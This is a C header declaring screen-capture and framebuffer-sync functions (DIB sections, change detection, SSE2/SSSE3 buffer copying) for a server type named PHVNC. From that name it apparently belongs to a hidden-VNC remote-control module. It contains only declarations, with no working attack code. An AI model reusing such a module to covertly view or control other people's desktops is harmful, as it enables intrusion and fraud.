#ifndef DIB_H_INCLUDED
#define DIB_H_INCLUDED

HBITMAP CreateDibSection(HDC hDC,void **lpBkgBits,HBITMAP hBitmap);
void InitIntermedDC(PHVNC lpServer,HDC hTmpDC);
bool SetNewFramebuffer(PHVNC lpServer,int dwWidth,int dwHeight,byte bBitsPerPixel);

void ChooseBestSyncProc();

void CopyScreenBuffer(PHVNC lpServer,RECT *lpRect);
void InitScreen(PHVNC lpServer,byte **plpOldBkgBits);
void InitOurDCs(PHVNC lpServer);

#define BLOCK_SIZE 32
void FastDetectChanges(PHVNC lpServer,bool bDeepScan);

typedef void (*SyncBuffersPtr)(PHVNC lpServer,byte *lpFrom,byte *lpTo,int dwLines,int dwStep,int dwBytesToCopy,DWORD **lppHashes);

void SyncBuffersSSE2(PHVNC lpServer,byte *lpFrom,byte *lpTo,int dwLines,int dwStep,int dwBytesToCopy,DWORD **lppHashes);
void SyncBuffersSSSE3(PHVNC lpServer,byte *lpFrom,byte *lpTo,int dwLines,int dwStep,int dwBytesToCopy,DWORD **lppHashes);
void SyncBuffersRegular(PHVNC lpServer,byte *lpFrom,byte *lpTo,int dwLines,int dwStep,int dwBytesToCopy,DWORD **lppHashes);

extern SyncBuffersPtr lpSyncProc;
extern HBRUSH hFrameBrush,hBlackBrush;

void GetScreenInfo(PHVNC lpServer);

void SetScreenSize(PHVNC lpServer,DWORD dwHeight,DWORD dwWidth,byte bBitsPerPixel);

#endif // DIB_H_INCLUDED
